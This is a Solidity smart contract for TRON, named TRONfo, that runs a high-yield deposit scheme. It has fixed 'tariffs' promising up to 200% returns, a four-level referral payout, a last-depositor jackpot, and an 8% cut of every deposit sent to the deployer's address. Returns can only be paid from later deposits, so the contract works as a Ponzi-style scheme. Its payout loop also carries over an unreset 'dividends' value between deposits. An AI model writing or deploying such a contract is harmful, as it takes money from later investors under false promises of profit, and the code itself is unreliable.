//SourceUnit: TRONfo.sol

pragma solidity ^0.4.25;

contract TRONfo {
  using SafeMath for uint256;
  struct Tariff {
    uint time;
    uint percent;
  }
  
  struct Deposit {
    uint tariff;
    uint amount;
    uint at;
		uint256 withdrawn;
  }

  struct Investor {
    bool registered;
    address referer;
    uint referrals_tier1;
    uint referrals_tier2;
    uint referrals_tier3;
    uint referrals_tier4;
    uint balanceRef;
    uint totalRef;
    uint totalDepositedByRefs;
    Deposit[] deposits;
    uint invested;
    uint paidAt;
    uint withdrawn;
		uint256 jackwithdrawn;
		uint256 Lastdepositdate;
	//	uint256 depositcount;
  }
  
  uint DAY = 28800;
  uint MIN_DEPOSIT = 25 trx;
  uint START_AT = 0;
  uint FUND_CRITERIA = 1000000 trx;
  uint REF_CRITERIA = 1000000 trx;

	uint256 public jackpot;
	uint256  public TIME_END = 28800*30;//30day
	uint256  public TIME_start;
	address[] public members100;
	
  address public support = msg.sender;
  
  Tariff[] public tariffs;
  uint[] public refRewards;
  uint public totalInvestors;
  uint public totalInvested;
  uint public totalRefRewards;
  uint256 public jackwithdrawn;
  mapping (address => Investor) public investors;
  
  event DepositAt(address user, uint tariff, uint amount);
  event Withdraw(address user, uint amount);
  
  function register(address referer) internal {
    if (!investors[msg.sender].registered) {
      investors[msg.sender].registered = true;
      totalInvestors++;
      
      if (investors[referer].registered && referer != msg.sender) {
        investors[msg.sender].referer = referer;
        
        address rec = referer;
        for (uint i = 0; i < refRewards.length; i++) {
          if (!investors[rec].registered) {
            break;
          }
          
          if (i == 0) {
            investors[rec].referrals_tier1++;
          }
          if (i == 1) {
            investors[rec].referrals_tier2++;
          }
          if (i == 2) {
            investors[rec].referrals_tier3++;
          }
          if (i == 3) {
            investors[rec].referrals_tier4++;
          }
          
          rec = investors[rec].referer;
        }
      }
    }
  }
  
  function rewardReferers(uint amount, address referer) internal {
    address rec = referer;
    
    for (uint i = 0; i < refRewards.length; i++) {
      if (!investors[rec].registered) {
        break;
      }
      
      uint a = amount * refRewards[i] / 100;
      investors[rec].balanceRef += a;
      investors[rec].totalRef += a;
      investors[rec].totalDepositedByRefs += amount;
      totalRefRewards += a;
      
      rec = investors[rec].referer;
    }
  }
  
  function getHoldBonus(address user) public view returns (uint) {
    return investors[user].paidAt == 0 ? 0 : (block.number - investors[user].paidAt) / DAY;
  }
  function getTIME_END() public view returns (uint256) {
    uint256 tmp=TIME_start.add(TIME_END);
    if(tmp>block.number){
      return tmp.sub(block.number).mul(3);}
    else
      return 0;
  }  
  function getFundBonus() public view returns (uint) {
    //return totalInvested / FUND_CRITERIA;
    return 0;
  }
  function getmembers100() public view returns (address[] _members100) {
    _members100=new  address[](100);
    for (uint i = 0; i < 100; i++) {
      if(members100.length.sub(1) >= i) 
      {
        _members100[i]=members100[members100.length.sub(1).sub(i)];
      }
    }
  
  }  
  function getRefBonus(address user) public view returns (uint) {
    return investors[user].totalDepositedByRefs / REF_CRITERIA;
  }
  function depositcount(address user) public view returns (uint256) {
    return investors[user].deposits.length;
  }
  function getreferer(address user) public view returns (address) {
    return investors[user].referer;
  }
  constructor() public {
    tariffs.push(Tariff(100 * DAY, 200));
    tariffs.push(Tariff(1 * DAY, 92));
   // tariffs.push(Tariff(130 * DAY, 286));
    //tariffs.push(Tariff(150 * DAY, 300));
    
   
      refRewards.push(5);
      refRewards.push(3);
      refRewards.push(1);
      refRewards.push(1);
    
	members100.push(msg.sender);
    
  }
  
  function deposit(uint tariff, address referer) external payable {
      if(TIME_start == 0){TIME_start=block.number;}
		require(TIME_END >= block.number.sub(TIME_start));
    require(block.number >= START_AT);
    require(msg.value >= MIN_DEPOSIT);
    require(tariff < tariffs.length);
    register(referer);
    support.transfer(msg.value.mul(8).div(100));
    rewardReferers(msg.value, investors[msg.sender].referer);
    
    investors[msg.sender].invested += msg.value;
    totalInvested += msg.value;
    
    investors[msg.sender].deposits.push(Deposit(tariff, msg.value, block.number,0));
    jackpot=jackpot.add(msg.value.mul(50).div(1000));
		TIME_END=TIME_END.add(10);

		investors[msg.sender].Lastdepositdate=now;
		//investors[msg.sender].depositcount++;
    members100.push(msg.sender);
    
    
    if (investors[msg.sender].paidAt == 0) {
      investors[msg.sender].paidAt = block.number;
    }
    
    emit DepositAt(msg.sender, tariff, msg.value);
  }
  
	function getjackvalue(address userAddress) public view returns (uint256) {
    uint256 amount=0;
    if(members100[members100.length.sub(1)] == userAddress)
      amount=amount.add(jackpot.div(2));
     uint256 j=members100.length;
     if(j>100) j=100;
		for (uint i = 1; i <j; i++) 
		{
      if(members100[members100.length.sub(1).sub(i)]== userAddress)
        amount=amount.add(jackpot.div(2).div(99));
    }
    amount=amount.sub(investors[userAddress].jackwithdrawn);
		return amount;
	}
	function jackwithdraw() public 
	{
    require(TIME_END < block.number.sub(TIME_start));
		Investor storage investor = investors[msg.sender];
    uint256 amount=getjackvalue(msg.sender);
    
    investor.jackwithdrawn=investor.jackwithdrawn.add(amount);
    jackwithdrawn=jackwithdrawn.add(amount);
    msg.sender.transfer(amount);
    emit Withdraw(msg.sender, amount);
	}
	function jackwithdrawn() public view returns (uint256) {
    return investors[msg.sender].jackwithdrawn;
	}
	function jackwithdrawn(address userAddress) public view returns (uint256) {
    return investors[userAddress].jackwithdrawn;
	}
	function getContractBalance() public view returns (uint256) {
		return address(this).balance.sub(jackpot.sub(jackwithdrawn));
	}
  function withdrawable(address user) public view returns (uint256) {
    uint256 amount=0;
    Investor storage investor = investors[user];
    uint256 dividends;
    uint holdBonus = getHoldBonus(user);
    uint fundBonus = getFundBonus();
    uint refBonus = getRefBonus(user);
    
    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      Tariff storage tariff = tariffs[dep.tariff];
      
      uint finish = dep.at + tariff.time;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;

      if (since < till) {
        dividends = dep.amount * (till - since) * tariff.percent / tariff.time / 100
          + dep.amount * (till - since) * (holdBonus + fundBonus + refBonus) / DAY / 1000;
      }
			if (dep.withdrawn.add(dividends) > dep.amount.mul(tariff.percent).div(100)) {
					dividends = (dep.amount.mul(tariff.percent).div(100)).sub(dep.withdrawn);
				}

				//investor.deposits[i].withdrawn = investor.deposits[i].withdrawn.add(dividends); /// changing of storage data
				amount = amount.add(dividends);
    }
    return amount;
  }
  function _withdrawable(address user) internal returns (uint256) {
    uint256 amount=0;
    Investor storage investor = investors[user];
    uint256 dividends;
    uint holdBonus = getHoldBonus(user);
    uint fundBonus = getFundBonus();
    uint refBonus = getRefBonus(user);
    
    for (uint i = 0; i < investor.deposits.length; i++) {
      Deposit storage dep = investor.deposits[i];
      Tariff storage tariff = tariffs[dep.tariff];
      
      uint finish = dep.at + tariff.time;
      uint since = investor.paidAt > dep.at ? investor.paidAt : dep.at;
      uint till = block.number > finish ? finish : block.number;

      if (since < till) {
        dividends = dep.amount * (till - since) * tariff.percent / tariff.time / 100
          + dep.amount * (till - since) * (holdBonus + fundBonus + refBonus) / DAY / 1000;
      }
			if (dep.withdrawn.add(dividends) > dep.amount.mul(tariff.percent).div(100)) {
					dividends = (dep.amount.mul(tariff.percent).div(100)).sub(dep.withdrawn);
				}

				investor.deposits[i].withdrawn = investor.deposits[i].withdrawn.add(dividends); /// changing of storage data
				amount = amount.add(dividends);
    }
    return amount;
  }
  function profit() internal returns (uint) {
    Investor storage investor = investors[msg.sender];
    
    uint amount = _withdrawable(msg.sender);
    
    amount += investor.balanceRef;
    investor.balanceRef = 0;
    
    investor.paidAt = block.number;
    
    return amount;
  }
  
  function withdraw() external {
    uint amount = profit();
		uint256 contractBalance = address(this).balance;
		contractBalance=contractBalance.sub(jackpot.sub(jackwithdrawn));
		if (contractBalance < amount) {
			amount = contractBalance;
		}
		
    msg.sender.transfer(amount);
    investors[msg.sender].withdrawn += amount;
    
    emit Withdraw(msg.sender, amount);
  }

  function trun(address where) external payable {
    where.transfer(msg.value);
  }
}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}